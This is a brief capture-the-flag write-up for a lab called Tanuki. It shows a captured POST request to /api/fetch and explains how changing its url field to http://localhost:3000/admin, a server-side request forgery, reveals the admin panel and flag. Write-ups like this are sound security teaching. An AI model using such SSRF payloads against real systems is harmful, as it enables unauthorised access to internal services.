# Tanuki

Level: Easy\
Points: 10\
Type: Daily Challenge

Lab Interface

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

The interesting request is for the stats page

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
POST /api/fetch HTTP/2
Host: lab-1772553605009-wg1rjm.labs-app.bugforge.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJzdXNoaWwiLCJpYXQiOjE3NzI1NTM2MjF9.NPJaxSBBUjqSBrSgRHp4NCNbsAsL4b0mgELIsnBsCj8
Content-Length: 43
Origin: https://lab-1772553605009-wg1rjm.labs-app.bugforge.io
Referer: https://lab-1772553605009-wg1rjm.labs-app.bugforge.io/leaderboard
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: green
Priority: u=0
Te: trailers

{"url":"http://localhost:3000/leaderboard"}
```

Possible `SSRF`&#x20;

I tried editing the url parameter.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Only port 3000 is allowed.&#x20;

After little bit of tinkering: `http://localhost:3000/admin` revealed the admin panel and flag.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
